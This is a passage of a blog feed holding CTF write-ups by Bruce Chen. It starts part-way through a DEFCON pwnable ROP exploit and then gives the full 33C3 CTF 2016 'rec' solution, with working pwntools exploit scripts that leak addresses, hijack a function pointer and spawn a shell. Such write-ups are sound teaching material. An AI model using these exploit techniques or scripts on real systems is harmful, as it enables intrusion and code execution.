context.log_level = ‘INFO’ # [‘CRITICAL’, ‘DEBUG’, ‘ERROR’, ‘INFO’, ‘NOTSET’, ‘WARN’, ‘WARNING’]
context.terminal = [‘tmux’, ‘splitw’] # for gdb.attach&lt;/p&gt;

&lt;p&gt;elf = context.binary # context.binary is an ELF object&lt;/p&gt;

&lt;p&gt;if &lt;strong&gt;name&lt;/strong&gt; == “&lt;strong&gt;main&lt;/strong&gt;”:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;r = remote(HOST, PORT)
#r = process(ELF_PATH)

#gdb.attach(r, gdbscript=open(&quot;./ggg&quot;, &quot;r&quot;))
func = 0x0806d7aa # avoid crash
scanf = 0x08048b2a
name = p32(scanf) + p32(func) + &quot;\x42&quot;*972 + p32(0x80ecdf4) + '\x00'*92  + p32(0x80ecdf8) 
r.sendlineafter(&quot;name?&quot;, name)

# Later the program will call scanf(&quot;%s&quot;, stdout);
# now we can overwrite the whole stdout FILE structure

stream = p32(0x08079824) # second gadget: add esp, 0x84....
stream += &quot;/home/peropdo/flag\x00&quot; # flag path
stream = stream.ljust(0x1c, '\0')
stream += p32(0x804b45c) # eip, first gadget: xchg esp, eax ; ret
stream = stream.ljust(0x48, '\0')
stream += p32(0x080ED3E8) # pointer to null
stream = stream.ljust(0x90, '\0')
stream += p32(0x807982b) # third gadget: pop; ret
stream += p32(0x80eb2a0) # fake jump table

# 0x08074f2e : mov eax, 5 ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret 
# 0x08079465 : mov ebx, eax ; mov eax, ebx ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
pop_ebx = 0x806f322  # pop ebx;ret
pop_eax = 0x80e3525  # pop eax;ret
pop_ecx = 0x080e5ee1 # pop ecx ; ret 
pop_edx = 0x0806f2fa # pop edx ; ret
int80 = 0x806fae0    # int 0x80 ; ret 
buf = 0x80ed000-0x100
rop = flat(
            pop_ecx,
            0,
            pop_edx, 
            0,
            0x08074f2e, # mov eax = 5 (open), pop ebx...
            0x80eb2a4, # ptr to flag path
            [0,0,0],
            int80,              
            pop_eax,
            3, # read
            pop_ebx,
            3, #fd
            pop_ecx,
            buf,
            pop_edx,
            0x100,
            int80,
            pop_ebx,
            1, # fd,
            pop_eax,
            4, # write
            int80
          )

r.sendline(stream + rop)
r.interactive() ```
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;flag: &lt;code class=&quot;highlighter-rouge&quot;&gt;Thanks to Kenshoto for the inspiration! 5fbb34920c457b2e0855a174b8de3ebc&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Later did I know (thanks to teammate &lt;a href=&quot;https://poning.me/&quot;&gt;Isaac&lt;/a&gt;) that there’s a thing call &lt;a href=&quot;https://www.hex-rays.com/products/ida/tech/flirt/index.shtml&quot;&gt;FLIRT&lt;/a&gt; in IDA Pro, which can help the user identify the function call in libc. All we need to do is download a FLIRT signature database from github ( &lt;a href=&quot;https://github.com/push0ebp/sig-database&quot;&gt;here’s&lt;/a&gt; the DB I used for this challenge ), and use &lt;strong&gt;FILE –&amp;gt; Load File –&amp;gt; FLIRT signature file&lt;/strong&gt; to load the database. IDA will then identify the function name, making the reverse engineering less painful. By using this technique, we’ll be able to identify some libc function, even the location of &lt;code class=&quot;highlighter-rouge&quot;&gt;stdout&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;And that’s when I found that the “self-implement random” function is actually just &lt;code class=&quot;highlighter-rouge&quot;&gt;srand()&lt;/code&gt; &amp;amp; &lt;code class=&quot;highlighter-rouge&quot;&gt;rand()&lt;/code&gt; in libc. According to &lt;a href=&quot;https://github.com/mehQQ&quot;&gt;meh&lt;/a&gt; from HITCON, you can just brute-force the desired return address. Moreover, because the &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt; buffer address is right under the return address, so you can just use &lt;code class=&quot;highlighter-rouge&quot;&gt;pop esp; ret&lt;/code&gt; to migrate the stack into &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt; buffer, and do the ROP attack. Guess I still got a lot of shit to learn :/&lt;/p&gt;</content><author><name>Bruce Chen</name></author><category term="Python" /><category term="C" /><category term="DEFCON" /><category term="CTF" /><category term="Pwnable" /><category term="ROP" /><category term="BOF" /><category term="file_stream_pointer_overflow" /><summary type="html">Category: Potent Pwnables</summary></entry><entry><title type="html">33C3 CTF 2016 – rec</title><link href="http://0.0.0.0:4000/33c3-ctf-2016-rec/" rel="alternate" type="text/html" title="33C3 CTF 2016 -- rec" /><published>2016-12-30T01:38:00+08:00</published><updated>2016-12-30T01:38:00+08:00</updated><id>http://0.0.0.0:4000/33c3-ctf-2016-rec</id><content type="html" xml:base="http://0.0.0.0:4000/33c3-ctf-2016-rec/">&lt;p&gt;&lt;strong&gt;Category:&lt;/strong&gt; pwn
&lt;strong&gt;Points:&lt;/strong&gt; 200&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;32 bit ELF, with all the protection enabled.&lt;/p&gt;

&lt;p&gt;program menu:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ./rec 
Calculators are fun!
0 - Take note
1 - Read note
2 - Polish
3 - Infix
4 - Reverse Polish
5 - Sign
6 - Exit
&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;ul&gt;
  &lt;li&gt;Take note: input a note&lt;/li&gt;
  &lt;li&gt;Read note: output the note&lt;/li&gt;
  &lt;li&gt;Polish: do the &lt;code class=&quot;highlighter-rouge&quot;&gt;sum&lt;/code&gt; operation or the elementary arithmetic (prefix expression)&lt;/li&gt;
  &lt;li&gt;Infix: do the elementary arithmetic (infix expression)&lt;/li&gt;
  &lt;li&gt;Reverse Polish: do the elementary arithmetic (postfix expression)&lt;/li&gt;
  &lt;li&gt;Sign: input a number and see if it is a positive/negative number&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;First we found that the &lt;code class=&quot;highlighter-rouge&quot;&gt;Read note&lt;/code&gt; function doesn’t work well:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ./rec 
Calculators are fun!
0 - Take note
1 - Read note
2 - Polish
3 - Infix
4 - Reverse Polish
5 - Sign
6 - Exit
&amp;gt; 0
Your note: 123
0 - Take note
1 - Read note
2 - Polish
3 - Infix
4 - Reverse Polish
5 - Sign
6 - Exit
&amp;gt; 1
Your note:�VXV`�s��`XV     &amp;lt;-- WTF?
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This is because the program use a stack address as the &lt;code class=&quot;highlighter-rouge&quot;&gt;note&lt;/code&gt;’s buffer. After we take a note and leave the function, the buffer will be filled with some (useful) addresses (due to the function epilogue). And because of this, we’re able to leak the stack address &amp;amp; text’s base address.&lt;/p&gt;

&lt;p&gt;Now it’s time to try controlling the EIP. There’s a program logic vulnerability in the &lt;code class=&quot;highlighter-rouge&quot;&gt;sign&lt;/code&gt; function:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts_negative&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts_positive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;It handles both positive &amp;amp; negative numbers. &lt;strong&gt;But what about &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt;&lt;/strong&gt; ?&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ./rec 
Calculators are fun!
0 - Take note
1 - Read note
2 - Polish
3 - Infix
4 - Reverse Polish
5 - Sign
6 - Exit
&amp;gt; 5
0
[1]    40091 segmentation fault (core dumped)  ./rec
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The reason why the program crash is because the program did not assigned a value to &lt;code class=&quot;highlighter-rouge&quot;&gt;v1&lt;/code&gt; (since it did not handle &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt;), so when it ran to line &lt;code class=&quot;highlighter-rouge&quot;&gt;v1()&lt;/code&gt;, it will set the EIP to &lt;code class=&quot;highlighter-rouge&quot;&gt;0x0&lt;/code&gt; and crash the program. Let’s check the assembly code:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x56555d3b:  mov    eax,DWORD PTR [ebp-0x20]   &amp;lt;-- &amp;amp;v1 = ebp-0x20
0x56555d3e:  call   eax
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;It shows that if we can control the value of &lt;code class=&quot;highlighter-rouge&quot;&gt;[ebp-0x20]&lt;/code&gt;, we’ll be able to control the EIP and hijack the program control flow.&lt;/p&gt;

&lt;p&gt;I found that the stack frame of the &lt;code class=&quot;highlighter-rouge&quot;&gt;sign&lt;/code&gt; function is “higher” (or “lesser”) than the other functions. If we can’t “reach that high” in other functions, we won’t be able to control the function pointer.&lt;/p&gt;

&lt;p&gt;After done some fuzzing, I finally found that in the &lt;code class=&quot;highlighter-rouge&quot;&gt;Polish&lt;/code&gt; function, if we do the &lt;code class=&quot;highlighter-rouge&quot;&gt;sum&lt;/code&gt; operation and keep entering number, the program will keep pushing number to the stack, making us able to “reach the height” and control the function pointer (and the parameters !) in the &lt;code class=&quot;highlighter-rouge&quot;&gt;sign&lt;/code&gt; function.&lt;/p&gt;

&lt;p&gt;So here’s how we gonna exploit the service:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Take a note &amp;amp; Read the note, leak the text’s base address&lt;/li&gt;
  &lt;li&gt;Use &lt;code class=&quot;highlighter-rouge&quot;&gt;Polish&lt;/code&gt;’s &lt;code class=&quot;highlighter-rouge&quot;&gt;sum&lt;/code&gt; operation to control the function pointer &amp;amp; the function parameter. We first set the function pointer to &lt;code class=&quot;highlighter-rouge&quot;&gt;puts&lt;/code&gt; and the parameter to &lt;code class=&quot;highlighter-rouge&quot;&gt;__libc_start_main@got&lt;/code&gt; (there’s no &lt;code class=&quot;highlighter-rouge&quot;&gt;.got.plt&lt;/code&gt; due to the &lt;strong&gt;FULL RELRO&lt;/strong&gt; protection)&lt;/li&gt;
  &lt;li&gt;Goto &lt;code class=&quot;highlighter-rouge&quot;&gt;sign&lt;/code&gt; function and input &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt;, it will call &lt;code class=&quot;highlighter-rouge&quot;&gt;puts(__libc_start_main@got)&lt;/code&gt; and gave us the libc’s base address&lt;/li&gt;
  &lt;li&gt;Repeat step 2, this time we set the function pointer to &lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt; and the parameter to “pointer to /bin/sh”&lt;/li&gt;
  &lt;li&gt;Goto &lt;code class=&quot;highlighter-rouge&quot;&gt;sign&lt;/code&gt; function and input &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt;, call &lt;code class=&quot;highlighter-rouge&quot;&gt;system(&quot;/bin/sh&quot;)&lt;/code&gt; and get the shell&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Here’s the exploit. The libc’s information are provided by &lt;a href=&quot;https://github.com/niklasb/libc-database&quot;&gt;libc-database&lt;/a&gt;
```python exp_rec.py
#!/usr/bin/env python&lt;/p&gt;

&lt;p&gt;from pwn import *
import subprocess
import sys
import time
import numpy&lt;/p&gt;

&lt;p&gt;HOST = “78.46.224.74”
PORT = 4127
ELF_PATH = “./rec”
LIBC_PATH = “”&lt;/p&gt;

&lt;h1 id=&quot;setting&quot;&gt;setting&lt;/h1&gt;
&lt;p&gt;context.arch = ‘i386’
context.os = ‘linux’
context.endian = ‘little’
context.word_size = 32&lt;/p&gt;
&lt;h1 id=&quot;critical-debug-error-info-notset-warn-warning&quot;&gt;[‘CRITICAL’, ‘DEBUG’, ‘ERROR’, ‘INFO’, ‘NOTSET’, ‘WARN’, ‘WARNING’]&lt;/h1&gt;
&lt;p&gt;context.log_level = ‘INFO’&lt;/p&gt;

&lt;p&gt;elf = ELF(ELF_PATH)&lt;/p&gt;

&lt;p&gt;def take_note(note):
    r.sendlineafter(“&amp;gt; “, “0”)
    r.sendlineafter(“note: “, note)&lt;/p&gt;

&lt;p&gt;def read_note():
    r.sendlineafter(“&amp;gt; “, “1”)&lt;/p&gt;

&lt;p&gt;def polish_sum(nums):
    r.sendlineafter(“&amp;gt; “, “2”)
    r.sendlineafter(“Operator:”, “S”)
    for num in nums:
        print “adding:”, num
        r.sendlineafter(“Operand:”, str(num))&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;r.sendlineafter(&quot;Operand:&quot;, &quot;.&quot;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;def sign(num):
    r.sendlineafter(“&amp;gt; “, “5”)
    r.sendline(str(num))&lt;/p&gt;

&lt;p&gt;if &lt;strong&gt;name&lt;/strong&gt; == “&lt;strong&gt;main&lt;/strong&gt;”:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;r = remote(HOST, PORT)
#r = process(ELF_PATH)

take_note(&quot;123&quot;)
read_note()

r.recvuntil(&quot;note: &quot;)
fptr_addr = u32(r.recv(4)) - 0x350 # where the function pointer be loaded
text_base = u32(r.recv(4)) - 0x6fb
puts = text_base + 0x520
lsm_got = text_base + 0x2fe0
puts_got = text_base + 0x2fd8

log.success(&quot;fptr_addr: &quot;+hex(fptr_addr))
log.success(&quot;text_base: &quot;+hex(text_base))

nums = [i for i in xrange(0x63)] + [puts, lsm_got]
polish_sum(nums)

sign(0) # this will call puts(lsm_got)
lsm_addr = u32(r.recv(4))
#########################################
#$ ./dump libc6-i386_2.24-3ubuntu2_amd64
#offset___libc_start_main = 0x00018180
#offset_system = 0x0003a8b0
#offset_str_bin_sh = 0x15cbcf
#########################################
system_addr = lsm_addr + 0x22730 
bin_sh = lsm_addr + 0x144a4f 

log.success(&quot;lsm: &quot;+hex(lsm_addr))
log.success(&quot;system: &quot;+hex(system_addr))
log.success(&quot;bin_sh: &quot;+hex(bin_sh))

nums = [i for i in xrange(0x63)] + [numpy.int32(system_addr), numpy.int32(bin_sh)]
polish_sum(nums)
sign(0) # this time will call system(&quot;/bin/sh&quot;)

r.interactive() ```
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The flag is in &lt;code class=&quot;highlighter-rouge&quot;&gt;/challenge/flag.txt&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;flag: &lt;code class=&quot;highlighter-rouge&quot;&gt;33C3_L0rd_Nikon_would_l3t_u_1n&lt;/code&gt;&lt;/p&gt;</content><author><name>Bruce Chen</name></author><category term="33C3" /><category term="CTF" /><category term="Python" /><category term="Pwnable" /><summary type="html">Category: pwn Points: 200</summary></entry></feed>